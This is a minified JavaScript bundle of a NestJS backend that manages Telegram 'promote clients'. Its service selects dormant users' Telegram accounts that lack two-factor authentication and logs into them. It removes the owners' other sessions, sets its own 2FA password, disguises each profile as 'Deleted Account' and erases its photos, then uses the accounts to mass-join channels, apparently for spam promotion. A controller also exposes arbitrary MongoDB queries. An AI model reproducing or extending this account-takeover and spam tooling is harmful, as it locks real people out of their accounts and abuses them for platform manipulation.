n,r=arguments.length,a=r<3?t:null===i?i=Object.getOwnPropertyDescriptor(t,o):i;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,o,i);else for(var s=e.length-1;s>=0;s--)(n=e[s])&&(a=(r<3?n(a):r>3?n(t,o,a):n(t,o))||a);return r>3&&a&&Object.defineProperty(t,o,a),a},n=this&&this.__metadata||function(e,t){if("object"==typeof Reflect&&"function"==typeof Reflect.metadata)return Reflect.metadata(e,t)};Object.defineProperty(t,"__esModule",{value:!0}),t.CreatePromoteClientDto=void 0;const r=o(9742),a=o(7403);class s{}t.CreatePromoteClientDto=s,i([(0,r.ApiProperty)({description:"Telegram ID of the client",example:"123456789"}),(0,a.IsString)(),n("design:type",String)],s.prototype,"tgId",void 0),i([(0,r.ApiProperty)({description:"Mobile number of the client",example:"+1234567890"}),(0,a.IsString)(),n("design:type",String)],s.prototype,"mobile",void 0),i([(0,r.ApiProperty)({description:"Date of the session",example:"2023-06-22"}),(0,a.IsString)(),n("design:type",String)],s.prototype,"availableDate",void 0),i([(0,r.ApiProperty)({description:"lastActive identifier",example:"2023-06-22"}),(0,a.IsString)(),n("design:type",String)],s.prototype,"lastActive",void 0),i([(0,r.ApiProperty)({description:"Channel Count",example:23,type:Number}),(0,a.IsNumber)(),n("design:type",Number)],s.prototype,"channels",void 0)},3993:function(e,t,o){var i=this&&this.__decorate||function(e,t,o,i){var n,r=arguments.length,a=r<3?t:null===i?i=Object.getOwnPropertyDescriptor(t,o):i;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,o,i);else for(var s=e.length-1;s>=0;s--)(n=e[s])&&(a=(r<3?n(a):r>3?n(t,o,a):n(t,o))||a);return r>3&&a&&Object.defineProperty(t,o,a),a},n=this&&this.__metadata||function(e,t){if("object"==typeof Reflect&&"function"==typeof Reflect.metadata)return Reflect.metadata(e,t)};Object.defineProperty(t,"__esModule",{value:!0}),t.SearchPromoteClientDto=void 0;const r=o(9742),a=o(7403);class s{}t.SearchPromoteClientDto=s,i([(0,r.ApiPropertyOptional)({description:"Telegram ID of the client",example:"123456789"}),(0,a.IsOptional)(),(0,a.IsString)(),n("design:type",String)],s.prototype,"tgId",void 0),i([(0,r.ApiPropertyOptional)({description:"Mobile number of the client",example:"+1234567890"}),(0,a.IsOptional)(),(0,a.IsString)(),n("design:type",String)],s.prototype,"mobile",void 0),i([(0,r.ApiPropertyOptional)({description:"availableDate of the promoteClient",example:"2023-06-22"}),(0,a.IsOptional)(),(0,a.IsString)(),n("design:type",String)],s.prototype,"availableDate",void 0),i([(0,r.ApiPropertyOptional)({description:"Channel Count",example:23,type:Number}),(0,a.IsNumber)(),n("design:type",Number)],s.prototype,"channels",void 0)},8150:(e,t,o)=>{Object.defineProperty(t,"__esModule",{value:!0}),t.UpdatePromoteClientDto=void 0;const i=o(9742),n=o(8977);class r extends((0,i.PartialType)(n.CreatePromoteClientDto)){}t.UpdatePromoteClientDto=r},2581:function(e,t,o){var i=this&&this.__decorate||function(e,t,o,i){var n,r=arguments.length,a=r<3?t:null===i?i=Object.getOwnPropertyDescriptor(t,o):i;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,o,i);else for(var s=e.length-1;s>=0;s--)(n=e[s])&&(a=(r<3?n(a):r>3?n(t,o,a):n(t,o))||a);return r>3&&a&&Object.defineProperty(t,o,a),a},n=this&&this.__metadata||function(e,t){if("object"==typeof Reflect&&"function"==typeof Reflect.metadata)return Reflect.metadata(e,t)},r=this&&this.__param||function(e,t){return function(o,i){t(o,i,e)}};Object.defineProperty(t,"__esModule",{value:!0}),t.PromoteClientController=void 0;const a=o(3563),s=o(9742),c=o(1870),l=o(8977),p=o(3993),d=o(8150);let u=class{constructor(e){this.clientService=e}async create(e){return this.clientService.create(e)}async search(e){return this.clientService.search(e)}async joinChannelsforPromoteClients(){return this.clientService.joinchannelForPromoteClients()}async checkpromoteClients(){return this.clientService.checkPromoteClients(),"initiated Checking"}async addNewUserstoPromoteClients(e){return this.clientService.addNewUserstoPromoteClients(e.badIds,e.goodIds),"initiated Checking"}async findAll(){return this.clientService.findAll()}async setAsPromoteClient(e){return await this.clientService.setAsPromoteClient(e)}async findOne(e){return this.clientService.findOne(e)}async update(e,t){return this.clientService.update(e,t)}async createdOrupdate(e,t){return this.clientService.createOrUpdate(e,t)}async remove(e){return this.clientService.remove(e)}async executeQuery(e){try{return await this.clientService.executeQuery(e)}catch(e){throw e}}};t.PromoteClientController=u,i([(0,a.Post)(),(0,s.ApiOperation)({summary:"Create user data"}),r(0,(0,a.Body)()),n("design:type",Function),n("design:paramtypes",[l.CreatePromoteClientDto]),n("design:returntype",Promise)],u.prototype,"create",null),i([(0,a.Get)("search"),(0,s.ApiOperation)({summary:"Search user data"}),r(0,(0,a.Query)()),n("design:type",Function),n("design:paramtypes",[p.SearchPromoteClientDto]),n("design:returntype",Promise)],u.prototype,"search",null),i([(0,a.Get)("joinChannelsForPromoteClients"),(0,s.ApiOperation)({summary:"Join Channels for PromoteClients"}),n("design:type",Function),n("design:paramtypes",[]),n("design:returntype",Promise)],u.prototype,"joinChannelsforPromoteClients",null),i([(0,a.Get)("checkPromoteClients"),(0,s.ApiOperation)({summary:"Check Promote Clients"}),n("design:type",Function),n("design:paramtypes",[]),n("design:returntype",Promise)],u.prototype,"checkpromoteClients",null),i([(0,a.Post)("addNewUserstoPromoteClients"),(0,s.ApiOperation)({summary:"Add New Users to Promote Clients"}),(0,s.ApiBody)({type:Object}),r(0,(0,a.Body)()),n("design:type",Function),n("design:paramtypes",[Object]),n("design:returntype",Promise)],u.prototype,"addNewUserstoPromoteClients",null),i([(0,a.Get)(),(0,s.ApiOperation)({summary:"Get all user data"}),n("design:type",Function),n("design:paramtypes",[]),n("design:returntype",Promise)],u.prototype,"findAll",null),i([(0,a.Get)("SetAsPromoteClient/:mobile"),(0,s.ApiOperation)({summary:"Set as Promote Client"}),(0,s.ApiParam)({name:"mobile",description:"User mobile number",type:String}),r(0,(0,a.Param)("mobile")),n("design:type",Function),n("design:paramtypes",[String]),n("design:returntype",Promise)],u.prototype,"setAsPromoteClient",null),i([(0,a.Get)(":mobile"),(0,s.ApiOperation)({summary:"Get user data by ID"}),r(0,(0,a.Param)("mobile")),n("design:type",Function),n("design:paramtypes",[String]),n("design:returntype",Promise)],u.prototype,"findOne",null),i([(0,a.Patch)(":mobile"),(0,s.ApiOperation)({summary:"Update user data by ID"}),r(0,(0,a.Param)("mobile")),r(1,(0,a.Body)()),n("design:type",Function),n("design:paramtypes",[String,d.UpdatePromoteClientDto]),n("design:returntype",Promise)],u.prototype,"update",null),i([(0,a.Put)(":mobile"),(0,s.ApiOperation)({summary:"Update user data by ID"}),r(0,(0,a.Param)("mobile")),r(1,(0,a.Body)()),n("design:type",Function),n("design:paramtypes",[String,d.UpdatePromoteClientDto]),n("design:returntype",Promise)],u.prototype,"createdOrupdate",null),i([(0,a.Delete)(":mobile"),(0,s.ApiOperation)({summary:"Delete user data by ID"}),r(0,(0,a.Param)("mobile")),n("design:type",Function),n("design:paramtypes",[String]),n("design:returntype",Promise)],u.prototype,"remove",null),i([(0,a.Post)("query"),(0,s.ApiOperation)({summary:"Execute a custom MongoDB query"}),(0,s.ApiBody)({type:Object}),r(0,(0,a.Body)()),n("design:type",Function),n("design:paramtypes",[Object]),n("design:returntype",Promise)],u.prototype,"executeQuery",null),t.PromoteClientController=u=i([(0,s.ApiTags)("Promote Clients"),(0,a.Controller)("promoteclients"),n("design:paramtypes",[c.PromoteClientService])],u)},1373:function(e,t,o){var i=this&&this.__decorate||function(e,t,o,i){var n,r=arguments.length,a=r<3?t:null===i?i=Object.getOwnPropertyDescriptor(t,o):i;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,o,i);else for(var s=e.length-1;s>=0;s--)(n=e[s])&&(a=(r<3?n(a):r>3?n(t,o,a):n(t,o))||a);return r>3&&a&&Object.defineProperty(t,o,a),a};Object.defineProperty(t,"__esModule",{value:!0}),t.PromoteClientModule=void 0;const n=o(3563),r=o(5839),a=o(1870),s=o(2581),c=o(4013),l=o(282),p=o(3322),d=o(7422),u=o(8009),y=o(5774),m=o(1324),h=o(8421);let f=class{};t.PromoteClientModule=f,t.PromoteClientModule=f=i([(0,n.Module)({imports:[y.initModule,r.MongooseModule.forFeature([{name:"promoteClientModule",schema:c.PromoteClientSchema,collection:"promoteClients"}]),(0,n.forwardRef)((()=>l.TelegramModule)),(0,n.forwardRef)((()=>d.UsersModule)),(0,n.forwardRef)((()=>p.ActiveChannelsModule)),(0,n.forwardRef)((()=>u.ClientModule)),(0,n.forwardRef)((()=>m.ChannelsModule)),(0,n.forwardRef)((()=>h.BufferClientModule))],controllers:[s.PromoteClientController],providers:[a.PromoteClientService],exports:[a.PromoteClientService]})],f)},1870:function(e,t,o){var i=this&&this.__decorate||function(e,t,o,i){var n,r=arguments.length,a=r<3?t:null===i?i=Object.getOwnPropertyDescriptor(t,o):i;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,o,i);else for(var s=e.length-1;s>=0;s--)(n=e[s])&&(a=(r<3?n(a):r>3?n(t,o,a):n(t,o))||a);return r>3&&a&&Object.defineProperty(t,o,a),a},n=this&&this.__metadata||function(e,t){if("object"==typeof Reflect&&"function"==typeof Reflect.metadata)return Reflect.metadata(e,t)},r=this&&this.__param||function(e,t){return function(o,i){t(o,i,e)}};Object.defineProperty(t,"__esModule",{value:!0}),t.PromoteClientService=void 0;const a=o(9597),s=o(3563),c=o(5839),l=o(6037),p=o(2995),d=o(7385),u=o(9127),y=o(9155),m=o(6185),h=o(5562),f=o(4374);let g=class{constructor(e,t,o,i,n,r,a){this.promoteClientModel=e,this.telegramService=t,this.usersService=o,this.activeChannelsService=i,this.clientService=n,this.channelsService=r,this.bufferClientService=a,this.joinChannelMap=new Map}async create(e){return new this.promoteClientModel(e).save()}async findAll(){return this.promoteClientModel.find().exec()}async findOne(e,t=!0){const o=(await this.promoteClientModel.findOne({mobile:e}).exec())?.toJSON();if(!o&&t)throw new s.NotFoundException(`PromoteClient with mobile ${e} not found`);return o}async update(e,t){const o=await this.promoteClientModel.findOneAndUpdate({mobile:e},{$set:t},{new:!0,upsert:!0,returnDocument:"after"}).exec();if(!o)throw new s.NotFoundException(`User with mobile ${e} not found`);return o}async createOrUpdate(e,t){const o=(await this.promoteClientModel.findOne({mobile:e}).exec())?.toJSON();return o?(console.log("Updating"),this.update(o.mobile,t)):(console.log("creating"),this.create(t))}async remove(e){if(await(0,m.fetchWithTimeout)(`${(0,m.ppplbot)()}&text=${encodeURIComponent(`Deleting Promote Client : ${e}`)}`),0===(await this.promoteClientModel.deleteOne({mobile:e}).exec()).deletedCount)throw new s.NotFoundException(`PromoteClient with mobile ${e} not found`)}async search(e){return console.log(e),e.firstName&&(e.firstName={$regex:new RegExp(e.firstName,"i")}),console.log(e),this.promoteClientModel.find(e).exec()}async executeQuery(e,t,o,i){try{if(!e)throw new s.BadRequestException("Query is invalid.");const n=this.promoteClientModel.find(e);return t&&n.sort(t),o&&n.limit(o),i&&n.skip(i),await n.exec()}catch(e){throw new s.InternalServerErrorException(e.message)}}removeFromPromoteMap(e){this.joinChannelMap.delete(e)}clearPromoteMap(){console.log("PromoteMap cleared"),this.joinChannelMap.clear()}async joinchannelForPromoteClients(e=!0){if(this.telegramService.getActiveClientSetup())return console.log("Ignored active check for promote channels as an active client setup exists"),"Active client setup exists, skipping promotion";console.log("Joining Channel Started"),this.clearJoinChannelInterval();try{const t=e?[]:Array.from(this.joinChannelMap.keys());await this.telegramService.disconnectAll(),await(0,d.sleep)(2e3);const o=await this.promoteClientModel.find({channels:{$lt:250},mobile:{$nin:t}}).sort({channels:1}).limit(4);if(o.length>0){for(const e of o)try{const t=await this.telegramService.createClient(e.mobile,!1,!1);console.log("Started Joining for : ",e.mobile);const o=await t.channelInfo(!0);console.log("Existing Channels Length : ",o.ids.length),await this.update(e.mobile,{channels:o.ids.length});let i=[];o.canSendFalseCount<50?(i=o.ids.length<220?await this.channelsService.getActiveChannels(150,0,o.ids):await this.activeChannelsService.getActiveChannels(150,0,o.ids),this.joinChannelMap.set(e.mobile,i)):await t.leaveChannels(o.canSendFalseChats),await this.telegramService.deleteClient(e.mobile)}catch(t){const o=(0,m.parseError)(t);console.error(`Error while joining channels for mobile: ${e.mobile}`,o)}this.joinChannelQueue()}return console.log("Joining Channel Triggered Successfully for",o.length),`Initiated Joining channels for ${o.length}`}catch(e){throw console.error("Error during the joinchannelForPromoteClients process: ",e),new Error("Failed to initiate channel joining process")}}async joinChannelQueue(){Array.from(this.joinChannelMap.keys()).length>0&&(this.joinChannelIntervalId=setInterval((async()=>{const e=Array.from(this.joinChannelMap.keys());if(e.length>0){console.log("In JOIN CHANNEL interval: ",(new Date).toISOString());for(const t of e){const e=this.joinChannelMap.get(t);if(e&&e.length>0){const o=e.shift();console.log(t," Pending Channels: ",e.length),this.joinChannelMap.set(t,e);try{await this.telegramService.createClient(t,!1,!1),console.log(t," Trying to join: ",o.username),await this.telegramService.tryJoiningChannel(t,o)}catch(e){const i=(0,m.parseError)(e,`${t} @${o.username} Outer Err ERR: `);console.error(`${t} Error while joining @${o.username}`,i),("FloodWaitError"===i.error||"CHANNELS_TOO_MUCH"===e.errorMessage)&&(console.log(`${t} has FloodWaitError or joined too many channels. Handling...`),this.removeFromPromoteMap(t),await this.telegramService.getChannelInfo(t,!0))}finally{await this.telegramService.deleteClient(t)}}else this.joinChannelMap.delete(t)}}else this.clearJoinChannelInterval()}),24e4))}clearJoinChannelInterval(){this.joinChannelIntervalId&&(clearInterval(this.joinChannelIntervalId),this.joinChannelIntervalId=null,setTimeout((()=>{this.joinchannelForPromoteClients(!1)}),3e4))}async setAsPromoteClient(e,t=new Date(Date.now()-864e5).toISOString().split("T")[0]){const o=(await this.usersService.search({mobile:e,expired:!1}))[0];if(!o)throw new s.BadRequestException("user not found");if(await this.findOne(e,!1))throw new s.ConflictException("PromoteClient already exist");const i=await this.clientService.findAll(),n=i.map((e=>e?.mobile)),r=i.flatMap((e=>e?.promoteMobile));if(n.includes(e)||r.includes(e))throw new s.BadRequestException("Number is a Active Client");{const i=await this.telegramService.createClient(e,!1);try{await i.set2fa(),await(0,d.sleep)(15e3),await i.updateUsername(""),await(0,d.sleep)(3e3),await i.updatePrivacyforDeletedAccount(),await(0,d.sleep)(3e3),await i.updateProfile("Deleted Account","Deleted Account"),await(0,d.sleep)(3e3),await i.deleteProfilePhotos();const n=await this.telegramService.getChannelInfo(e,!0),r={tgId:o.tgId,lastActive:"default",mobile:o.mobile,availableDate:t,channels:n.ids.length};await this.promoteClientModel.findOneAndUpdate({tgId:o.tgId},{$set:r},{new:!0,upsert:!0}).exec()}catch(e){const t=(0,m.parseError)(e);throw new s.HttpException(t.message,parseInt(t.status))}return await this.telegramService.deleteClient(e),"Client set as promote successfully"}}async checkPromoteClients(){if(this.telegramService.getActiveClientSetup())console.log("ignored active check promote channels as active client setup exists");else{await this.telegramService.disconnectAll(),await(0,d.sleep)(2e3);const e=await this.findAll();let t=[],o=[];if(e.length<80)for(let t=0;t<80-e.length&&o.length<4;t++)o.push(t.toString());const i=await this.clientService.findAll(),n=await this.bufferClientService.findAll(),r=[...i.map((e=>e.mobile)),...i.flatMap((e=>e.promoteMobile))],a=n.map((e=>e.mobile));new Date(Date.now()).toISOString().split("T")[0];for(const i of e)if(r.includes(i.mobile)||a.includes(i.mobile))console.log("Number is a Active Client"),t.push(i.mobile),this.remove(i.mobile);else try{const e=await this.telegramService.createClient(i.mobile,!0,!1),n=await e.getMe();n.username&&(await this.telegramService.updateUsername(i.mobile,""),await(0,d.sleep)(2e3)),"Deleted Account"!==n.firstName&&(await this.telegramService.updateNameandBio(i.mobile,"Deleted Account",""),await(0,d.sleep)(2e3)),await this.telegramService.deleteProfilePhotos(i.mobile),!await e.hasPassword()&&o.length<4?(console.log("Client does not have password"),o.push(i.mobile)):(console.log(i.mobile," :  ALL Good"),t.push(i.mobile)),await this.telegramService.removeOtherAuths(i.mobile),await(0,d.sleep)(2e3),await this.telegramService.deleteClient(i.mobile)}catch(e){(0,m.parseError)(e),o.push(i.mobile),this.remove(i.mobile),await this.telegramService.deleteClient(i.mobile)}t=[...t,...r,...a],console.log("GoodIds: ",t.length,"BadIds : ",o.length),this.addNewUserstoPromoteClients(o,t)}}async addNewUserstoPromoteClients(e,t){const o=new Date(Date.now()-7776e6).toISOString().split("T")[0],i=await this.usersService.executeQuery({mobile:{$nin:t},twoFA:!1,expired:!1,lastActive:{$lt:o},totalChats:{$gt:250}},{tgId:1},e.length+3);for(console.log("New promote documents to be added: ",i.length);e.length>0&&i.length>0;){const t=i.shift();try{try{const o=await this.telegramService.createClient(t.mobile,!1),i=await o.hasPassword();if(console.log("hasPassword: ",i),i)console.log("Failed to Update as PromoteClient has Password"),await this.usersService.update(t.tgId,{twoFA:!0}),await this.telegramService.deleteClient(t.mobile);else{await o.removeOtherAuths(),await o.set2fa(),console.log("waiting for setting 2FA"),await(0,d.sleep)(3e4),await o.updateUsername(""),await(0,d.sleep)(3e3),await o.updatePrivacyforDeletedAccount(),await(0,d.sleep)(3e3),await o.updateProfile("Deleted Account","Deleted Account"),await(0,d.sleep)(3e3),await o.deleteProfilePhotos();const i=await o.channelInfo(!0);console.log("Inserting Document");const n={tgId:t.tgId,lastActive:"today",mobile:t.mobile,availableDate:new Date(Date.now()-864e5).toISOString().split("T")[0],channels:i.ids.length};await this.create(n),await this.usersService.update(t.tgId,{twoFA:!0}),console.log("=============Created PromoteClient============="),await this.telegramService.deleteClient(t.mobile),e.pop()}}catch(e){(0,m.parseError)(e),await this.telegramService.deleteClient(t.mobile)}}catch(e){(0,m.parseError)(e),console.error("An error occurred:",e)}await this.telegramService.deleteClient(t.mobile)}setTimeout((()=>{this.joinchannelForPromoteClients()}),12e4)}};t.PromoteClientService=g,t.PromoteClientService=g=i([(0,s.Injectable)(),r(0,(0,c.InjectModel)("promoteClientModule")),r(1,(0,s.Inject)((0,s.forwardRef)((()=>p.TelegramService)))),r(2,(0,s.Inject)((0,s.forwardRef)((()=>u.UsersService)))),r(3,(0,s.Inject)((0,s.forwardRef)((()=>y.ActiveChannelsService)))),r(4,(0,s.Inject)((0,s.forwardRef)((()=>h.ClientService)))),r(5,(0,s.Inject)((0,s.forwardRef)((()=>y.ActiveChannelsService)))),r(6,(0,s.Inject)((0,s.forwardRef)((()=>f.BufferClientService)))),n("design:paramtypes",[l.Model,p.TelegramService,u.UsersService,y.ActiveChannelsService,h.ClientService,a.ChannelsService,f.BufferClientService])],g)},4013:function(e,t,o){var i=this&&this.__decorate||function(e,t,o,i){var n,r=arguments.length,a=r<3?t:null===i?i=Object.getOwnPropertyDescriptor(t,o):i;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,o,i);else for(var s=e.length-1;s>=0;s--)(n=e[s])&&(a=(r<3?n(a):r>3?n(t,o,a):n(t,o))||a);return r>3&&a&&Object.defineProperty(t,o,a),a},n=this&&this.__metadata||function(e,t){if("object"==typeof Reflect&&"function"==typeof Reflect.metadata)return Reflect.metadata(e,t)};Object.defineProperty(t,"__esModule",{value:!0}),t.PromoteClientSchema=t.PromoteClient=void 0;const r=o(5839);let a=class{};t.PromoteClient=a,i([(0,r.Prop)({required:!0}),n("design:type",String)],a.prototype,"tgId",void 0),i([(0,r.Prop)({required:!0,unique:!0}),n("design:type",String)],a.prototype,"mobile",void 0),i([(0,r.Prop)({required:!0}),n("design:type",String)],a.prototype,"lastActive",void 0),i([(0,r.Prop)({required:!0}),n("design:type",String)],a.prototype,"availableDate",void 0),i([(0,r.Prop)({required:!0,type:Number}),n("design:type",Number)],a.prototype,"channels",void 0),t.PromoteClient=a=i([(0,r.Schema)({collection:"promoteClients",versionKey:!1,autoIndex:!0,timestamps:!0,toJSON:{virtuals:!0,transform:(e,t)=>{delete t._id}}})],a),t.PromoteClientSchema=r.SchemaFactory.createForClass(a)},4966:function(e,t,o){var i=this&&this.__decorate||function(e,t,o,i){var n,r=arguments.length,a=r<3?t:null===i?i=Object.getOwnPropertyDescriptor(t,o):i;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,o,i);else for(var s=e.length-1;s>=0;s--)(n=e[s])&&(a=(r<3?n(a):r>3?n(t,o,a):n(t,o))||a);return r>3&&a&&Object.defineProperty(t,o,a),a},n=this&&this.__metadata||function(e,t){if("object"==typeof Reflect&&"function"==typeof Reflect.metadata)return Reflect.metadata(e,t)},r=this&&this.__param||function(e,t){return function(o,i){t(o,i,e)}};Object.defineProperty(t,"__esModule",{value:!0}),t.PromoteMsgsController=void 0;const a=o(3563),s=o(9742),c=o(9199);let l=class{constructor(e){this.promoteMsgsService=e}async findOne(){return this.promoteMsgsService.findOne()}async update(e){return this.promoteMsgsService.update(e)}};t.PromoteMsgsController=l,i([(0,a.Get)(),(0,s.ApiOperation)({summary:"Get promote-msgs data"}),n("design:type",Function),n("design:paramtypes",[]),n("design:returntype",Promise)],l.prototype,"findOne",null),i([(0,a.Patch)(),(0,s.ApiOperation)({summary:"Update promote-msgs"}),(0,s.ApiBody)({type:Object}),r(0,(0,a.Body)()),n("design:type",Function),n("design:paramtypes",[Object]),n("design:returntype",Promise)],l.prototype,"update",null),t.PromoteMsgsController=l=i([(0,s.ApiTags)("Promote-msgs"),(0,a.Controller)("promote-msgs"),n("design:paramtypes",[c.PromoteMsgsService])],l)},5014:function(e,t,o){var i=this&&this.__decorate||function(e,t,o,i){var n,r=arguments.length,a=r<3?t:null===i?i=Object.getOwnPropertyDescriptor(t,o):i;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,o,i);else for(var s=e.length-1;s>=0;s--)(n=e[s])&&(a=(r<3?n(a):r>3?n(t,o,a):n(t,o))||a);return r>3&&a&&Object.defineProperty(t,o,a),a};Object.defineProperty(t,"__esModule",{value:!0}),t.PromoteMsgModule=void 0;const n=o(3563),r=o(5839),a=o(9199),s=o(4966),c=o(8213);let l=class{};t.PromoteMsgModule=l,t.PromoteMsgModule=l=i([(0,n.Global)(),(0,n.Module)({imports:[l,r.MongooseModule.forFeature([{name:"promotemsgModule",collection:"promoteMsgs",schema:c.PromoteMsgSchema}])],providers:[a.PromoteMsgsService],controllers:[s.PromoteMsgsController],exports:[a.PromoteMsgsService]})],l)},8213:function(e,t,o){var i=this&&this.__decorate||function(e,t,o,i){var n,r=arguments.length,a=r<3?t:null===i?i=Object.getOwnPropertyDescriptor(t,o):i;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,o,i);else for(var s=e.length-1;s>=0;s--)(n=e[s])&&(a=(r<3?n(a):r>3?n(t,o,a):n(t,o))||a);return r>3&&a&&Object.defineProperty(t,o,a),a};Object.defineProperty(t,"__esModule",{value:!0}),t.PromoteMsgSchema=t.PromoteMsg=void 0;const n=o(5839),r=o(6037);let a=class{};t.PromoteMsg=a,t.PromoteMsg=a=i([(0,n.Schema)({versionKey:!1,autoIndex:!0,strict:!1,timestamps:!0,toJSON:{virtuals:!0,transform:(e,t)=>{delete t._id}}})],a),t.PromoteMsgSchema=n.SchemaFactory.createForClass(a),t.PromoteMsgSchema.add({type:r.default.Schema.Types.Mixed})},9199:function(e,t,o){var i=this&&this.__decorate||function(e,t,o,i){var n,r=arguments.length,a=r<3?t:null===i?i=Object.getOwnPropertyDescriptor(t,o):i;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,o,i);else for(var s=e.length-1;s>=0;s--)(n=e[s])&&(a=(r<3?n(a):r>3?n(t,o,a):n(t,o))||a);return r>3&&a&&Object.defineProperty(t,o,a),a},n=this&&this.__metadata||function(e,t){if("object"==typeof Reflect&&"function"==typeof Reflect.metadata)return Reflect.metadata(e,t)},r=this&&this.__param||function(e,t){return function(o,i){t(o,i,e)}};Object.defineProperty(t,"__esModule",{value:!0}),t.PromoteMsgsService=void 0;const a=o(3563),s=o(5839),c=o(6037);let l=class{constructor(e){this.promotemsgModel=e}async OnModuleInit(){console.log("Config Module Inited")}async findOne(){const e=(await this.promotemsgModel.findOne({},{_id:0}).exec())?.toJSON();if(!e)throw new a.NotFoundException("promotemsgModel not found");return e}async update(e){delete e._id;const t=await this.promotemsgModel.findOneAndUpdate({},{$set:{...e}},{new:!0,upsert:!0}).exec();if(!t)throw new a.NotFoundException("promotemsgModel not found");return t}};t.PromoteMsgsService=l,t.PromoteMsgsService=l=i([(0,a.Injectable)(),r(0,(0,s.InjectModel)("promotemsgModule")),n("design:paramtypes",[c.Model])],l)},5639:function(e,t,o){var i=this&&this.__decorate||function(e,t,o,i){var n,r=arguments.length,a=r<3?t:null===i?i=Object.getOwnPropertyDescriptor(t,o):i;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,o,i);else for(var s=e.length-1;s>=0;s--)(n=e[s])&&(a=(r<3?n(a):r>3?n(t,o,a):n(t,o))||a);return r>3&&a&&Object.defineProperty(t,o,a),a},n=this&&this.__metadata||function(e,t){if("object"==typeof Reflect&&"function"==typeof Reflect.metadata)return Reflect.metadata(e,t)};Object.defineProperty(t,"__esModule",{value:!0}),t.CreatePromoteStatDto=void 0;const r=o(9742);class a{}t.CreatePromoteStatDto=a,i([(0,r.ApiProperty)({example:"shruthi1",description:"Client ID"}),n("design:type",String)],a.prototype,"client",void 0),i([(0,r.ApiProperty)({example:{Girls_Chating_Group_07:4,girls_friends_chatting_group_01:14},description:"Data"}),n("design:type",Map)],a.prototype,"data",void 0),i([(0,r.ApiProperty)({example:552,description:"Total Count"}),n("design:type",Number)],a.prototype,"totalCount",void 0),i([(0,r.ApiProperty)({example:314,description:"Unique Channels"}),n("design:type",Number)],a.prototype,"uniqueChannels",void 0),i([(0,r.ApiProperty)({example:1719929752982,description:"Release Day"}),n("design:type",Number)],a.prototype,"releaseDay",void 0),i([(0,r.ApiProperty)({example:1719860106247,description:"Last Updated TimeStamp"}),n("design:type",Number)],a.prototype,"lastUpdatedTimeStamp",void 0),i([(0,r.ApiProperty)({example:!0,description:"Is Active"}),n("design:type",Boolean)],a.prototype,"isActive",void 0),i([(0,r.ApiProperty)({example:["And_Girls_Boys_Group_Chatting","Girls_Chating_Group_07"],description:"Channels"}),n("design:type",Array)],a.prototype,"channels",void 0)},7108:(e,t,o)=>{Object.defineProperty(t,"__esModule",{value:!0}),t.UpdatePromoteStatDto=void 0;const i=o(9742),n=o(5639);class r extends((0,i.PartialType)(n.CreatePromoteStatDto)){}t.UpdatePromoteStatDto=r},7317:function(e,t,o){var i=this&&this.__decorate||function(e,t,o,i){var n,r=arguments.length,a=r<3?t:null===i?i=Object.getOwnPropertyDescriptor(t,o):i;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,o,i);else for(var s=e.length-1;s>=0;s--)(n=e[s])&&(a=(r<3?n(a):r>3?n(t,o,a):n(t,o))||a);return r>3&&a&&Object.defineProperty(t,o,a),a},n=this&&this.__metadata||function(e,t){if("object"==typeof Reflect&&"function"==typeof Reflect.metadata)return Reflect.metadata(e,t)},r=this&&this.__param||function(e,t){return function(o,i){t(o,i,e)}};Object.defineProperty(t,"__esModule",{value:!0}),t.PromoteStatController=void 0;const a=o(3563),s=o(9742),c=o(1630),l=o(5639),p=o(7108);let d=class{constructor(e){this.promoteStatService=e}async create(e){return this.promoteStatService.create(e)}async findByClient(e){return this.promoteStatService.findByClient(e)}async update(e,t){return this.promoteStatService.update(e,t)}async deleteOne(e){return this.promoteStatService.deleteOne(e)}async deleteAll(){return this.promoteStatService.deleteAll()}};t.PromoteStatController=d,i([(0,a.Post)(),r(0,(0,a.Body)()),n("design:type",Function),n("design:paramtypes",[l.CreatePromoteStatDto]),n("design:returntype",Promise)],d.prototype,"create",null),i([(0,a.Get)(":client"),r(0,(0,a.Param)("client")),n("design:type",Function),n("design:paramtypes",[String]),n("design:returntype",Promise)],d.prototype,"findByClient",null),i([(0,a.Put)(":client"),r(0,(0,a.Param)("client")),r(1,(0,a.Body)()),n("design:type",Function),n("design:paramtypes",[String,p.UpdatePromoteStatDto]),n("design:returntype",Promise)],d.prototype,"update",null),i([(0,a.Delete)(":client"),r(0,(0,a.Param)("client")),n("design:type",Function),n("design:paramtypes",[String]),n("design:returntype",Promise)],d.prototype,"deleteOne",null),i([(0,a.Delete)(),n("design:type",Function),n("design:paramtypes",[]),n("design:returntype",Promise)],d.prototype,"deleteAll",null),t.PromoteStatController=d=i([(0,s.ApiTags)("promote-stats"),(0,a.Controller)("promote-stats"),n("design:paramtypes",[c.PromoteStatService])],d)},3085:function(e,t,o){var i=this&&this.__decorate||function(e,t,o,i){var n,r=arguments.length,a=r<3?t:null===i?i=Object.getOwnPropertyDescriptor(t,o):i;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)a=Reflect.decorate(e,t,o,i);else for(var s=e.length-1;s>=0;s--)(n=e[s])&&(a=(r<3?n(a):r>3?n(t,o,a):n(t,o))||a);return r>3&&a&&Object.defineProperty(t,o,a),a};Object.defineProperty(t,"__esModule",{value:!0}),t.PromoteStatModule=void 0;const n=o(5774),r=o(3563),a=o(5839),s=o(1630),c=o(7317),l=o(937),p=o(8009);let 